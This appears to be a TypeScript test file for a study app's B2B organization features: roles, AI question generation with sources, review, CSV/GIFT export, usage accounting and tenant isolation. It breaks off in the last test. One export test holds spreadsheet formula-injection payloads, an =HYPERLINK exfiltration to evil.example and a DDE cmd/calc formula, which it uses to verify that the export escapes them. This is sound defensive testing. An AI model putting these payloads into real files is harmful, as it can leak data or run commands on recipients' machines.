/**
 * Organizations (B2B): sign-up account types, membership and roles, organization courses, draft generation
 * with located sources, review (edit / approve / reject / retire), the question bank and exports, usage
 * accounting per organization, cross-organization isolation, and account deletion leaving organization data
 * intact. Students' own courses and limits are untouched by any of it.
 */
import assert from 'node:assert/strict';
import { readFile } from 'node:fs/promises';
import { after, test } from 'node:test';
import type {
  AdminOrganization,
  AuthResponse,
  BankItem,
  BankItemDetail,
  BankItemList,
  DocumentDetail,
  DocumentSummary,
  Entitlement,
  GenerateBankItemsResult,
  OrganizationMember,
  OrganizationMembershipSummary,
  OrganizationOverview,
  TopicCount,
  User,
} from '@study/shared';

const OWNER_EMAIL = `org-owner-${Date.now()}@example.com`;
Object.assign(process.env, { AI_PROVIDER: 'mock', BILLING_MOCK_ENABLED: 'true', OWNER_EMAILS: OWNER_EMAIL });
delete process.env.PLAN_LIMITS_OVERRIDE;
delete process.env.PLAN_FEATURES_OVERRIDE;
const { app } = await import('../src/app.js');
const { sql } = await import('../src/db/client.js');
const { studyAI, AIError } = await import('../src/ai/index.js');
const { flushAIUsage, recordAIUsage } = await import('../src/admin/ai-usage-recorder.js');
const { currentAIUsage } = await import('../src/ai/usage.js');
const PASSWORD = 'correct-horse-battery-staple';
const RUN = Date.now();
// Organizations outlive the accounts that created them (that is the point): remove this run's at the end so
// the shared test database doesn't accumulate them.
after(async () => {
  const ids = (await sql`select id from organizations where name like ${`Org % ${RUN}`} or name = 'Second org'`) as unknown as { id: string }[];
  for (const { id } of ids) {
    await sql`delete from documents where organization_id = ${id}`;
    await sql`delete from organizations where id = ${id}`;
  }
  await sql.end();
});
let n = 0;
async function call<T>(path: string, init: RequestInit & { token?: string } = {}) {
  const { token, ...rest } = init;
  const res = await app.request(path, { ...rest, headers: { 'x-forwarded-for': `10.9.${++n % 250}.2`, ...(token && { Authorization: `Bearer ${token}` }), ...(rest.headers ?? {}) } });
  const text = await res.text();
  const isJson = res.headers.get('content-type')?.includes('json');
  return { status: res.status, text, headers: res.headers, body: (isJson && text ? JSON.parse(text) : null) as T & { code?: string; details?: unknown } };
}
const json = (method: string, body: unknown) => ({ method, body: JSON.stringify(body), headers: { 'Content-Type': 'application/json' } });
const pdf = await readFile(new URL('./fixtures/biology-notes.pdf', import.meta.url));

type Account = { email: string; token: string; id: string; user: User };
async function signup(tag: string, extra: Record<string, unknown> = {}): Promise<Account> {
  const email = (extra.email as string | undefined) ?? `org-${tag}-${RUN}-${++n}@example.com`;
  const r = await call<AuthResponse>('/auth/register', json('POST', { email, password: PASSWORD, name: `Person ${tag}`, ageRange: '25_34', ...extra }));
  assert.equal(r.status, 201, JSON.stringify(r.body));
  return { email, token: r.body.token, id: r.body.user.id, user: r.body.user };
}
const orgSignup = (tag: string, market: 'training_provider' | 'academy' = 'training_provider') =>
  signup(tag, { accountType: 'organization', organizationName: `Org ${tag} ${RUN}`, market });
const orgOf = (a: Account) => a.user.organizations[0].id;

async function uploadCourse(token: string, orgId: string, name = 'notes.pdf') {
  const form = new FormData();
  form.append('file', new File([pdf], name, { type: 'application/pdf' }));
  form.append('title', name);
  const up = await call<DocumentDetail>(`/orgs/${orgId}/courses`, { method: 'POST', body: form, token });
  assert.equal(up.status, 201, JSON.stringify(up.body));
  for (let i = 0; i < 100; i++) {
    const d = await call<DocumentDetail>(`/orgs/${orgId}/courses/${up.body.id}`, { token });
    if (d.body.status === 'ready') return d.body;
    await new Promise((r) => setTimeout(r, 100));
  }
  throw new Error('course not ready');
}
const generate = (token: string, orgId: string, docId: string, body: object = {}) =>
  call<GenerateBankItemsResult>(`/orgs/${orgId}/courses/${docId}/generate`, { ...json('POST', body), token });

test('sign-up: students by default (older apps too); organization accounts create their organization and are its first admin', async () => {
  const s = await signup('student');
  assert.equal(s.user.accountType, 'student');
  assert.deepEqual(s.user.organizations, []);
  const legacy = await call<AuthResponse>('/auth/register', json('POST', { email: `org-legacy-${RUN}@example.com`, password: PASSWORD, name: 'Old app', ageRange: '18_24' }));
  assert.equal(legacy.body.user.accountType, 'student');

  const o = await orgSignup('acme', 'academy');
  assert.equal(o.user.accountType, 'organization');
  assert.equal(o.user.organizations.length, 1);
  assert.deepEqual([o.user.organizations[0].name, o.user.organizations[0].market, o.user.organizations[0].role], [`Org acme ${RUN}`, 'academy', 'admin']);
  // Both /auth/me and login return the same.
  const me = await call<User>('/auth/me', { token: o.token });
  assert.deepEqual(me.body.organizations, o.user.organizations);
  const login = await call<AuthResponse>('/auth/login', json('POST', { email: o.email, password: PASSWORD }));
  assert.equal(login.body.user.organizations[0].id, orgOf(o));
  // Staff are never asked the student questionnaire; students still are.
  const ob = await call<{ status: string }>('/onboarding', { token: o.token });
  assert.equal(ob.body.status, 'skipped');
  assert.equal((await call<{ status: string }>('/onboarding', { token: s.token })).body.status, 'pending');

  // Validation: an organization sign-up needs a name and a market; the client cannot pick an unknown type.
  for (const bad of [{ accountType: 'organization' }, { accountType: 'organization', organizationName: 'X' }, { accountType: 'organization', organizationName: 'Org', market: 'bank' }, { accountType: 'owner' }]) {
    const r = await call('/auth/register', json('POST', { email: `org-bad-${RUN}-${++n}@example.com`, password: PASSWORD, name: 'B', ageRange: '18_24', ...bad }));
    assert.equal(r.status, 400, JSON.stringify(bad));
  }
  // Only organization accounts create further organizations; students are added by an admin.
  assert.equal((await call(`/orgs`, { ...json('POST', { name: 'Side org', market: 'training_provider' }), token: s.token })).status, 403);
  const second = await call<OrganizationMembershipSummary>(`/orgs`, { ...json('POST', { name: 'Second org', market: 'training_provider' }), token: o.token });
  assert.equal(second.status, 201);
  assert.equal((await call<OrganizationMembershipSummary[]>('/orgs', { token: o.token })).body.length, 2);
  // Capped per account (sign-up organization included): every organization has its own free monthly allowances,
  // so creating them without limit would multiply one account's AI quota. The default cap is 2.
  const third = await call(`/orgs`, { ...json('POST', { name: 'Third org', market: 'training_provider' }), token: o.token });
  assert.equal(third.status, 403, JSON.stringify(third.body));
  assert.equal(third.body.code, 'organization_limit_reached');
  assert.deepEqual(third.body.details, { max: 2 });
  assert.equal((await call<OrganizationMembershipSummary[]>('/orgs', { token: o.token })).body.length, 2, 'nothing created');
  assert.equal(((await sql`select count(*)::int as n from organizations where name = 'Third org'`) as unknown as { n: number }[])[0].n, 0);
});

test('membership and roles: add by email of an existing account, change role, never remove the last admin; access read per request', async () => {
  const admin = await orgSignup('roles');
  const orgId = orgOf(admin);
  const editor = await signup('editor');
  const reviewer = await signup('reviewer');
  const outsider = await signup('outsider');

  // Non-members (and anonymous callers) see nothing, not even that the organization exists.
  assert.equal((await call(`/orgs/${orgId}`, { token: outsider.token })).status, 404);
  assert.equal((await call(`/orgs/${orgId}`)).status, 401);
  assert.equal((await call(`/orgs/${orgId}/members`, { token: outsider.token })).status, 404);

  assert.equal((await call(`/orgs/${orgId}/members`, { ...json('POST', { email: 'nobody@example.com', role: 'editor' }), token: admin.token })).status, 404);
  const added = await call<OrganizationMember[]>(`/orgs/${orgId}/members`, { ...json('POST', { email: editor.email.toUpperCase(), role: 'editor' }), token: admin.token });
  assert.equal(added.status, 201);
  await call(`/orgs/${orgId}/members`, { ...json('POST', { email: reviewer.email, role: 'reviewer' }), token: admin.token });
  const members = await call<OrganizationMember[]>(`/orgs/${orgId}/members`, { token: admin.token });
  assert.deepEqual(members.body.map((m) => m.role), ['admin', 'editor', 'reviewer']);
  // Adding someone changes nothing about their account type or plan.
  const e = await call<User>('/auth/me', { token: editor.token });
  assert.equal(e.body.accountType, 'student');
  assert.equal(e.body.organizations[0].role, 'editor');
  assert.equal((await call<Entitlement>('/billing/status', { token: editor.token })).body.tier, 'free');

  // Role gates: members list is admin-only; uploads are editor+; reading the overview is for everyone in the org.
  assert.equal((await call(`/orgs/${orgId}/members`, { token: editor.token })).status, 403);
  assert.equal((await call(`/orgs/${orgId}/members`, { token: reviewer.token })).status, 403);
  assert.equal((await call<OrganizationOverview>(`/orgs/${orgId}`, { token: reviewer.token })).body.role, 'reviewer');
  const form = new FormData();
  form.append('file', new File([pdf], 'x.pdf', { type: 'application/pdf' }));
  assert.equal((await call(`/orgs/${orgId}/courses`, { method: 'POST', body: form, token: reviewer.token })).status, 403);

  // Re-adding an existing member is refused: roles change only through PATCH, where the last-admin rule applies.
  // (An upsert here used to let the only admin "add" themselves as reviewer and lock everyone out.)
  const readd = await call<OrganizationMember[]>(`/orgs/${orgId}/members`, { ...json('POST', { email: admin.email, role: 'reviewer' }), token: admin.token });
  assert.equal(readd.status, 409, JSON.stringify(readd.body));
  assert.equal(readd.body.code, 'already_member');
  assert.equal((await call(`/orgs/${orgId}/members`, { ...json('POST', { email: editor.email.toUpperCase(), role: 'admin' }), token: admin.token })).body.code, 'already_member');
  assert.deepEqual((await call<OrganizationMember[]>(`/orgs/${orgId}/members`, { token: admin.token })).body.map((m) => [m.userId, m.role]), [[admin.id, 'admin'], [editor.id, 'editor'], [reviewer.id, 'reviewer']], 'roles unchanged');
  assert.equal((await call(`/orgs/${orgId}`, { token: admin.token })).status, 200, 'the admin still has access');

  // Last admin protection; demotion and removal of others works; removal takes effect on the next request.
  assert.equal((await call(`/orgs/${orgId}/members/${admin.id}`, { ...json('PATCH', { role: 'editor' }), token: admin.token })).status, 409);
  assert.equal((await call(`/orgs/${orgId}/members/${admin.id}`, { method: 'DELETE', token: admin.token })).status, 409);
  assert.equal((await call(`/orgs/${orgId}/members/${editor.id}`, { ...json('PATCH', { role: 'admin' }), token: admin.token })).status, 200);
  assert.equal((await call(`/orgs/${orgId}/members/${admin.id}`, { method: 'DELETE', token: editor.token })).status, 200, 'two admins: the first can be removed by the second');
  assert.equal((await call(`/orgs/${orgId}`, { token: admin.token })).status, 404, 'removed: gone on the next call, whatever the token says');
  assert.equal((await call<User>('/auth/me', { token: admin.token })).body.organizations.length, 0);
});

test('workflow: upload → generate drafts with located sources and flags → review → bank → export (approved only); students unaffected', async () => {
  const admin = await orgSignup('flow', 'training_provider');
  const orgId = orgOf(admin);
  const doc = await uploadCourse(admin.token, orgId, 'Safety course.pdf');
  assert.ok(doc.topics.length > 0);
  // The uploader's own student view never shows the organization's course, and their free plan is untouched.
  assert.deepEqual((await call<DocumentSummary[]>('/documents', { token: admin.token })).body, []);
  assert.equal((await call(`/documents/${doc.id}`, { token: admin.token })).status, 404);
  const ent = await call<Entitlement>('/billing/status', { token: admin.token });
  assert.deepEqual([ent.body.usage.courses, ent.body.usage.courseUploadsThisMonth], [0, 0]);

  // Generate: drafts only, each with a source located in one passage (page range + offsets + hash) or marked unlocated.
  const g = await generate(admin.token, orgId, doc.id, { count: 6, questionTypes: 'mixed' });
  assert.equal(g.status, 201, JSON.stringify(g.body));
  assert.ok(g.body.items.length >= 1 && g.body.items.length <= 6);
  assert.equal(g.body.requested, 6);
  for (const it of g.body.items) {
    assert.equal(it.status, 'draft');
    assert.equal(it.origin, 'ai');
    assert.equal(it.version, 1);
    assert.equal(it.documentTitle, 'Safety course');
    assert.equal(it.sources.length, 1);
    const s = it.sources[0];
    assert.equal(s.documentId, doc.id);
    assert.ok(s.quote.length > 0);
    if (s.located) {
      assert.ok(s.chunkId && s.chunkHash.length === 64, 'chunk reference');
      assert.ok(s.pageStart !== null && s.pageStart >= 1, 'page known');
      if (s.matchScore === 1) assert.ok(s.quoteStart !== null && s.quoteEnd !== null && s.quoteEnd > s.quoteStart);
    } else {
      assert.deepEqual([s.chunkId, s.pageStart, s.quoteStart], [null, null, null], 'uncertain location claims nothing');
      assert.ok(it.reviewFlags.includes('unlocated'));
    }
    assert.ok(it.verification && ['supported', 'partial', 'unsupported', 'unavailable'].includes(it.verification.verdict));
  }
  // Mixed types were asked for; the academy profile would have forced mcq only (checked below).
  const located = g.body.items.filter((i) => i.sources[0].located);
  assert.ok(located.length > 0, 'the mock quotes are verbatim sentences: at least one must locate');
  // The chunk hash really is the hash of the stored chunk.
  const first = located[0].sources[0];
  const [chunkRow] = (await sql`select content from document_chunks where id = ${first.chunkId}`) as unknown as { content: string }[];
  const { createHash } = await import('node:crypto');
  assert.equal(createHash('sha256').update(chunkRow.content, 'utf8').digest('hex'), first.chunkHash);
  if (first.quoteStart !== null) assert.ok(chunkRow.content.slice(first.quoteStart, first.quoteEnd!).length > 0);

  // Usage: charged to the organization (what was kept), not to the person.
  const ov = await call<OrganizationOverview>(`/orgs/${orgId}`, { token: admin.token });
  assert.deepEqual([ov.body.usage.coursesThisMonth, ov.body.usage.itemsThisMonth, ov.body.counts.drafts, ov.body.counts.courses], [1, g.body.items.length, g.body.items.length, 1]);
  assert.equal((await call<Entitlement>('/billing/status', { token: admin.token })).body.usage.practiceQuestionsThisMonth, 0);
  // AI cost attribution: every call made for the organization runs in a usage context naming it (the
  // provider records that context in ai_usage; the mock provider reports no usage, so the context is checked).
  const seen: { feature: string; organizationId?: string | null; userId: string | null }[] = [];
  const origGen = studyAI.generateQuestions.bind(studyAI);
  const origVerify = studyAI.verifyQuestions.bind(studyAI);
  studyAI.generateQuestions = async (input) => (seen.push(currentAIUsage()), origGen(input));
  studyAI.verifyQuestions = async (input) => (seen.push(currentAIUsage()), origVerify(input));
  try {
    assert.equal((await generate(admin.token, orgId, doc.id, { count: 2 })).status, 201);
  } finally {
    studyAI.generateQuestions = origGen;
    studyAI.verifyQuestions = origVerify;
  }
  assert.ok(seen.length >= 2);
  assert.ok(seen.every((c) => c.organizationId === orgId && c.userId === admin.id), JSON.stringify(seen));
  assert.deepEqual([...new Set(seen.map((c) => c.feature))].sort(), ['bank_generation', 'bank_verification']);
  await flushAIUsage();
  // The recorder stores the organization id (exercised directly: the mock provider never reports usage).
  recordAIUsage({ provider: 'test', model: 'm', inputTokens: 1, outputTokens: 1, cacheReadTokens: null, cacheWriteTokens: null, latencyMs: 5, success: true, errorCode: null }, { userId: admin.id, organizationId: orgId, feature: 'bank_generation' });
  await flushAIUsage();
  const [aiRows] = (await sql`select count(*)::int as n from ai_usage where organization_id = ${orgId}`) as unknown as { n: number }[];
  assert.equal(aiRows.n, 1);
  const ov2 = await call<OrganizationOverview>(`/orgs/${orgId}`, { token: admin.token });
  assert.ok((ov2.body.usage.aiCostMicroUsdThisMonth ?? -1) >= 0 || ov2.body.usage.aiCostMicroUsdThisMonth === null);

  // Review: an edit makes version 2 and keeps it a draft; approve/reject are explicit; nothing is approved by itself.
  const item = g.body.items[0];
  const edited = await call<BankItemDetail>(`/orgs/${orgId}/items/${item.id}`, { ...json('PATCH', { stem: `${item.stem} (edited)`, section: 'Module 1' }), token: admin.token });
  assert.equal(edited.status, 200, JSON.stringify(edited.body));
  assert.deepEqual([edited.body.version, edited.body.status, edited.body.section], [2, 'draft', 'Module 1']);
  assert.deepEqual(edited.body.events.map((e) => e.action), ['edited', 'generated']);
  const approved = await call<BankItemDetail>(`/orgs/${orgId}/items/${item.id}/approve`, { ...json('POST', { note: 'Checked against p. 1' }), token: admin.token });
  assert.equal(approved.status, 200);
  assert.deepEqual([approved.body.status, approved.body.reviewedBy, approved.body.reviewNote], ['approved', admin.id, 'Checked against p. 1']);
  assert.equal((await call(`/orgs/${orgId}/items/${item.id}/approve`, { ...json('POST', {}), token: admin.token })).status, 409, 'already approved');
  // Editing the content of an approved item sends it back to draft (version 3); metadata-only edits don't.
  const meta = await call<BankItemDetail>(`/orgs/${orgId}/items/${item.id}`, { ...json('PATCH', { legalRef: { law: 'Ley 31/1995', article: 'art. 14' } }), token: admin.token });
  assert.deepEqual([meta.body.status, meta.body.version, meta.body.legalRef?.law], ['approved', 2, 'Ley 31/1995']);
  const content = await call<BankItemDetail>(`/orgs/${orgId}/items/${item.id}`, { ...json('PATCH', { explanation: 'Because the manual says so.' }), token: admin.token });
  assert.deepEqual([content.body.status, content.body.version], ['draft', 3]);
  await call(`/orgs/${orgId}/items/${item.id}/approve`, { ...json('POST', {}), token: admin.token });
  const [revs] = (await sql`select count(*)::int as n from bank_item_revisions where bank_item_id = ${item.id}`) as unknown as { n: number }[];
  assert.equal(revs.n, 3, 'one snapshot per version');
  if (g.body.items[1]) {
    const rejected = await call<BankItemDetail>(`/orgs/${orgId}/items/${g.body.items[1].id}/reject`, { ...json('POST', { note: 'Not in the material' }), token: admin.token });
    assert.equal(rejected.body.status, 'rejected');
  }

  // A manual question (no AI): draft like any other, no sources.
  const manual = await call<BankItem>(`/orgs/${orgId}/items`, {
    ...json('POST', { documentId: doc.id, type: 'mcq', topic: doc.topics[0], section: 'Module 1', stem: 'Hand-written?', options: ['Yes', 'No', 'Maybe', 'Never'], correctAnswer: 'Yes', explanation: 'By hand.' }),
    token: admin.token,
  });
  assert.equal(manual.status, 201, JSON.stringify(manual.body));
  assert.deepEqual([manual.body.status, manual.body.origin, manual.body.sources.length], ['draft', 'manual', 0]);
  assert.equal((await call(`/orgs/${orgId}/items`, { ...json('POST', { documentId: doc.id, type: 'mcq', topic: doc.topics[0], stem: 'Bad', options: ['A', 'B'], correctAnswer: 'C' }), token: admin.token })).status, 400);

  // Bank views and topics.
  const drafts = await call<BankItemList>(`/orgs/${orgId}/items?status=draft`, { token: admin.token });
  assert.ok(drafts.body.items.every((i) => i.status === 'draft'));
  const approvedList = await call<BankItemList>(`/orgs/${orgId}/items?status=approved&documentId=${doc.id}`, { token: admin.token });
  assert.deepEqual(approvedList.body.items.map((i) => i.id), [item.id]);
  const topics = await call<TopicCount[]>(`/orgs/${orgId}/topics`, { token: admin.token });
  assert.ok(topics.body.some((t) => t.section === 'Module 1' && t.approved >= 1));

  // Export: approved only, CSV and GIFT, with the source reference; drafts never appear.
  const csv = await call(`/orgs/${orgId}/export?format=csv`, { token: admin.token });
  assert.equal(csv.status, 200);
  assert.equal(csv.headers.get('x-exama-export-count'), '1');
  assert.ok(csv.text.includes(item.id) && csv.text.includes('Safety course'));
  assert.ok(!csv.text.includes(manual.body.id), 'draft not exported');
  const gift = await call(`/orgs/${orgId}/export?format=gift&documentId=${doc.id}`, { token: admin.token });
  assert.ok(gift.text.includes('$CATEGORY: $course$/top/Safety course / Module 1'));
  assert.ok(gift.text.includes('Because the manual says so.'));
  assert.equal((await call(`/orgs/${orgId}/export?format=xml`, { token: admin.token })).status, 400);

  // Retire an approved question: no longer exported.
  const retired = await call<BankItemDetail>(`/orgs/${orgId}/items/${item.id}/retire`, { ...json('POST', { note: 'Outdated' }), token: admin.token });
  assert.equal(retired.body.status, 'retired');
  assert.equal((await call(`/orgs/${orgId}/export?format=csv`, { token: admin.token })).headers.get('x-exama-export-count'), '0');

  // CSV cells that a spreadsheet would run as formulas (leading = + - @) are exported as text (apostrophe prefix);
  // ordinary cells are untouched. A question written as a formula must never execute on a colleague's machine.
  const trap = await call<BankItem>(`/orgs/${orgId}/items`, {
    ...json('POST', {
      documentId: doc.id,
      type: 'mcq',
      topic: doc.topics[0],
      stem: '=HYPERLINK("https://evil.example/?"&A1,"open")',
      options: ['+1', '-2', '@SUM(A1)', 'plain'],
      correctAnswer: 'plain',
      explanation: "=cmd|' /C calc'!A0",
    }),
    token: admin.token,
  });
  assert.equal(trap.status, 201, JSON.stringify(trap.body));
  assert.equal((await call(`/orgs/${orgId}/items/${trap.body.id}/approve`, { ...json('POST', {}), token: admin.token })).status, 200);
  const trapCsv = await call(`/orgs/${orgId}/export?format=csv`, { token: admin.token });
  assert.equal(trapCsv.headers.get('x-exama-export-count'), '1');
  const line = trapCsv.text.split('\r\n').find((l) => l.includes(trap.body.id))!;
  assert.ok(line.includes(`"'=HYPERLINK(""https://evil.example/?""&A1,""open"")"`), line);
  assert.ok(line.includes(`"'+1","'-2","'@SUM(A1)","plain"`), line);
  assert.ok(line.includes(`"'=cmd|' /C calc'!A0"`), line);
  assert.ok(line.includes(`"Safety course"`) && !line.includes(`"'Safety course"`), 'ordinary cells are not prefixed');
  assert.ok(!/(^|,)"[=+\-@]/.test(line), 'no cell starts with a formula character');
  await call(`/orgs/${orgId}/items/${trap.body.id}/retire`, { ...json('POST', {}), token: admin.token });
});

test('generation rules: academy market is multiple-choice only; unknown topic / empty page range / unknown course refused; AI failure refunds the allowance', async () => {
  const admin = await orgSignup('rules', 'academy');
  const orgId = orgOf(admin);
  const doc = await uploadCourse(admin.token, orgId);
  const g = await generate(admin.token, orgId, doc.id, { count: 4, topic: doc.topics[0] });
  assert.equal(g.status, 201, JSON.stringify(g.body));
  assert.ok(g.body.items.every((i) => i.type === 'mcq' && i.options?.length === 4 && i.topic === doc.topics[0]));
  assert.equal((await generate(admin.token, orgId, doc.id, { topic: 'Not a topic' })).status, 400);
  assert.equal((await generate(admin.token, orgId, doc.id, { pageStart: 5, pageEnd: 2 })).status, 400);
  assert.equal((await generate(admin.token, orgId, doc.id, { pageStart: 900, pageEnd: 950 })).status, 422, 'no text in that range');
  assert.equal((await generate(admin.token, orgId, crypto.randomUUID())).status, 404);
  assert.equal((await generate(admin.token, orgId, doc.id, { count: 50 })).status, 400, 'per-request maximum');

  const before = (await call<OrganizationOverview>(`/orgs/${orgId}`, { token: admin.token })).body.usage.itemsThisMonth;
  const original = studyAI.generateQuestions.bind(studyAI);
  studyAI.generateQuestions = async () => {
    throw new AIError('unavailable', 'down');
  };
  try {
    assert.equal((await generate(admin.token, orgId, doc.id, { count: 3 })).status, 503);
  } finally {
    studyAI.generateQuestions = original;
  }
  assert.equal((await call<OrganizationOverview>(`/orgs/${orgId}`, { token: admin.token })).body.usage.itemsThisMonth, before, 'nothing delivered, nothing charged');

  // The verifier failing never fails generation: items are flagged instead.
  const originalVerify = studyAI.verifyQuestions.bind(studyAI);
  studyAI.verifyQuestions = async () => {
    throw new AIError('unavailable', 'down');
  };
  try {
    const g2 = await generate(admin.token, orgId, doc.id, { count: 2 });
    assert.equal(g2.status, 201);
    assert.ok(g2.body.items.every((i) => i.verification?.verdict === 'unavailable' && i.reviewFlags.includes('verifier_unavailable')));
  } finally {
    studyAI.verifyQuestions = originalVerify;
  }
});

test('isolation: organization B cannot read, write, download or delete anything of organization A, even with valid ids', async () => {
  const a = await orgSignup('isoA');
  const b = await orgSignup('isoB');
  const orgA = orgOf(a);
  const orgB = orgOf(b);
  const doc = await uploadCourse(a.token, orgA);
  const g = await generate(a.token, orgA, doc.id, { count: 3 });
  const item = g.body.items[0];
  await call(`/orgs/${orgA}/items/${item.id}/approve`, { ...json('POST', {}), token: a.token });

  const probes: [string, RequestInit][] = [
    [`/orgs/${orgA}`, {}],
    [`/orgs/${orgA}/courses`, {}],
    [`/orgs/${orgA}/courses/${doc.id}`, {}],
    [`/orgs/${orgA}/courses/${doc.id}`, { method: 'DELETE' }],
    [`/orgs/${orgA}/courses/${doc.id}/generate`, json('POST', { count: 2 })],
    [`/orgs/${orgA}/items`, {}],
    [`/orgs/${orgA}/items/${item.id}`, {}],
    [`/orgs/${orgA}/items/${item.id}`, json('PATCH', { stem: 'hijack' })],
    [`/orgs/${orgA}/items/${item.id}/approve`, json('POST', {})],
    [`/orgs/${orgA}/items/${item.id}`, { method: 'DELETE' }],
    [`/orgs/${orgA}/export?format=csv`, {}],
    [`/orgs/${orgA}/members`, {}],
    [`/orgs/${orgA}/topics`, {}],
  ];
  for (const [path, init] of probes) assert.equal((await call(path, { ...init, token: b.token })).status, 404, `${init.method ?? 'GET'} ${path}`);
  // Path swapping: A's ids under B's own organization are not found either.
  assert.equal((await call(`/orgs/${orgB}/courses/${doc.id}`, { token: b.token })).status, 404);
  assert.equal((await call(`/orgs/${orgB}/items/${item.id}`, { token: b.token })).status, 404);
  assert.equal((await call(`/orgs/${orgB}/items/${item.id}`, { ...json('PATCH', { stem: 'hijack' }), token: b.token })).status, 404);
  assert.equal((await call(`/orgs/${orgB}/courses/${doc.id}/generate`, { ...json('POST', { count: 2 }), token: b.token })).status, 404);
  assert.equal((await call(`/orgs/${orgB}/items`, { ...json('POST', { documentId: doc.id, type: 'mcq', topic: 'x', stem: 'y', options: ['a', 'b'], correctAnswer: 'a' }), token: b.token })).status, 404, "a manual item can't attach to A's course");
  // B's export contains nothing of A's.
  const csv = await call(`/orgs/${orgB}/export?format=csv`, { token: b.token });
  assert.equal(csv.headers.get('x-exama-export-count'), '0');
  assert.ok(!csv.text.includes(item.id));
  // Database level: a source or item cannot point across organizations.
  await assert.rejects(sql`insert into bank_items (organization_id, document_id, type, topic, stem, correct_answer, origin) values (${orgB}, ${doc.id}, 'mcq', 't', 's', 'a', 'manual')`, /foreign key/);
  // A's item is untouched.
  const still = await call<BankItemDetail>(`/orgs/${orgA}/items/${item.id}`, { token: a.token });
  assert.deepEqual([still.body.status, still.body.stem], ['approved', item.stem]);
  // Students never reach organization routes for courses they don't belong to, and the student routes never serve organization courses.
  const s = await signup('iso-student');
  assert.equal((await call(`/orgs/${orgA}/courses/${doc.id}`, { token: s.token })).status, 404);
  assert.equal((await call(`/documents/${doc.id}/exams`, { ...json('POST', { kind: 'standard', questionCount: 3 }), token: s.token })).status, 404);
  assert.equal((await call(`/documents/${doc.id}/exams`, { ...json('POST', { kind: 'standard', questionCount: 3 }), token: a.token })).status, 404, 'not even for the uploader');
});

test('account deletion: a staff member leaves; the organization keeps its courses, files, questions and usage', async () => {
  const admin = await orgSignup('del');
  const orgId = orgOf(admin);
  const editor = await signup('del-editor');
  await call(`/orgs/${orgId}/members`, { ...json('POST', { email: editor.email, role: 'admin' }), token: admin.token });
  // The editor uploads the course and generates the drafts; they also have a personal course of their own.
  const doc = await uploadCourse(editor.token, orgId, 'Org manual.pdf');
  const g = await generate(editor.token, orgId, doc.id, { count: 3 });
  assert.equal(g.status, 201);
  const form = new FormData();
  form.append('file', new File([pdf], 'mine.pdf', { type: 'application/pdf' }));
  const personal = await call<DocumentDetail>('/documents', { method: 'POST', body: form, token: editor.token });
  assert.equal(personal.status, 201);
  const [docRow] = (await sql`select file_key from documents where id = ${doc.id}`) as unknown as { file_key: string }[];
  assert.ok(docRow.file_key.startsWith(`org/${orgId}/`), 'organization files live under the organization, not the uploader');
  const { storage } = await import('../src/storage/index.js');

  const del = await call('/auth/me', { ...json('DELETE', { password: PASSWORD }), token: editor.token });
  assert.equal(del.status, 200, JSON.stringify(del.body));

  // Organization data intact, file still there, uploader link cleared; the personal course and its file are gone.
  const after = await call<DocumentDetail>(`/orgs/${orgId}/courses/${doc.id}`, { token: admin.token });
  assert.equal(after.status, 200);
  assert.equal(after.body.status, 'ready');
  assert.ok(await storage.get(docRow.file_key));
  const [owner] = (await sql`select user_id, organization_id from documents where id = ${doc.id}`) as unknown as { user_id: string | null; organization_id: string }[];
  assert.deepEqual(owner, { user_id: null, organization_id: orgId });
  const items = await call<BankItemList>(`/orgs/${orgId}/items?documentId=${doc.id}`, { token: admin.token });
  assert.equal(items.body.total, g.body.items.length);
  assert.ok(items.body.items.every((i) => i.createdBy === null && i.sources.length === 1));
  const ov = await call<OrganizationOverview>(`/orgs/${orgId}`, { token: admin.token });
  assert.deepEqual([ov.body.usage.coursesThisMonth, ov.body.usage.itemsThisMonth, ov.body.counts.members], [1, g.body.items.length, 1]);
  const [gone] = (await sql`select count(*)::int as n from documents where id = ${personal.body.id}`) as unknown as { n: number }[];
  assert.equal(gone.n, 0, 'personal course deleted with the account');
  await assert.rejects(storage.get(`${editor.id}/${personal.body.id}.pdf`));
  const [orphans] = (await sql`select count(*)::int as n from documents where user_id is null and organization_id is null`) as unknown as { n: number }[];
  assert.equal(orphans.n, 0);
});

test('student regression: a student with personal courses, exams and usage is unchanged by the organization tables', async () => {
  const s = await signup('regress');
  const form = new FormData();
  form.append('file', new File([pdf], 'bio.pdf', { type: 'application/pdf' }));
  const up = await call<DocumentDetail>('/documents', { method: 'POST', body: form, token: s.token });
  assert.equal(up.status, 201);
  let d = up.body;
  for (let i = 0; i < 100 && d.status !== 'ready'; i++) {
    await new Promise((r) => setTimeout(r, 100));
    d = (await call<DocumentDetail>(`/documents/${d.id}`, { token: s.token })).body;
  }
  assert.equal(d.status, 'ready');
  const exam = await call<{ questions: unknown[] }>(`/documents/${d.id}/exams`, { ...json('POST', { kind: 'standard', questionCount: 3 }), token: s.token });
  assert.equal(exam.status, 201);
  assert.equal(exam.body.questions.length, 3);
  const ent = await call<Entitlement>('/billing/status', { token: s.token });
  assert.deepEqual([ent.body.tier, ent.body.usage.courses, ent.body.usage.examGenerationsThisMonth], ['free', 1, 1]);
  // Free plan: a second course is still refused as before.
  const again = await call('/documents', { method: 'POST', body: (() => { const f = new FormData(); f.append('file', new File([pdf], 'two.pdf', { type: 'application/pdf' })); return f; })(), token: s.token });
  assert.equal(again.status, 402);
  // No organization routes for a student without memberships.
  assert.deepEqual((await call<OrganizationMembershipSummary[]>('/orgs', { token: s.token })).body, []);
});

test('owner tooling: organizations are listed with usage; limits and suspension are set by the owner only; a suspended organization is read-only', async () => {
  const owner = await signup('owner-admin', { email: OWNER_EMAIL });
  const admin = await orgSignup('owned');
  const orgId = orgOf(admin);
  // Only the owner (server configuration) reaches /admin/organizations: an organization admin gets 403.
  assert.equal((await call('/admin/organizations', { token: admin.token })).status, 403);
  const list = await call<AdminOrganization[]>('/admin/organizations', { token: owner.token });
  assert.equal(list.status, 200);
  const mine = list.body.find((o) => o.id === orgId)!;
  assert.deepEqual([mine.market, mine.status, mine.limits.itemsPerMonth, mine.counts.members, mine.creatorEmail], ['training_provider', 'active', 500, 1, admin.email]);

  // Limits: merged over the defaults and enforced on the next generation.
  const updated = await call<AdminOrganization>(`/admin/organizations/${orgId}`, { ...json('PATCH', { limits: { itemsPerMonth: 2 } }), token: owner.token });
  assert.deepEqual([updated.body.limits.itemsPerMonth, updated.body.limits.coursesPerMonth], [2, 20]);
  const doc = await uploadCourse(admin.token, orgId);
  const g = await generate(admin.token, orgId, doc.id, { count: 5 });
  assert.equal(g.status, 201);
  assert.ok(g.body.items.length <= 2, 'trimmed to what is left this month');
